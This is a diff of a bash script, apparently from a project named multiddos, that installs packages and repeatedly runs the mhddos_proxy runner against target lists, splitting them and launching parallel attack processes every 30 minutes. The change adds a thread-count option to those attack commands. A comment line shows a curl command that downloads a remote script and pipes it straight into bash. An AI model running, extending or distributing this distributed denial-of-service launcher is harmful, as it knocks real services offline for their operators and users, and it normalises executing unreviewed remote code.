@@ -1,6 +1,6 @@
 #!/bin/bash
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v0.5j\n"
+clear && echo -e "Loading... v0.5k\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -139,9 +139,9 @@ while true; do
         python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 5000 &
     else
         cd /var/tmp/; split -n l/2 --additional-suffix=.uaripper $targets_uniq; cd - #split targets in 2
-        python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xaa.uaripper $methods $args_to_pass &
+        python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xaa.uaripper $methods $threads $args_to_pass &
         sleep 5 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xab.uaripper $methods $args_to_pass &
+        python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xab.uaripper $methods $threads $args_to_pass &
     fi
 sleep 30m
 prepare_targets_and_banner
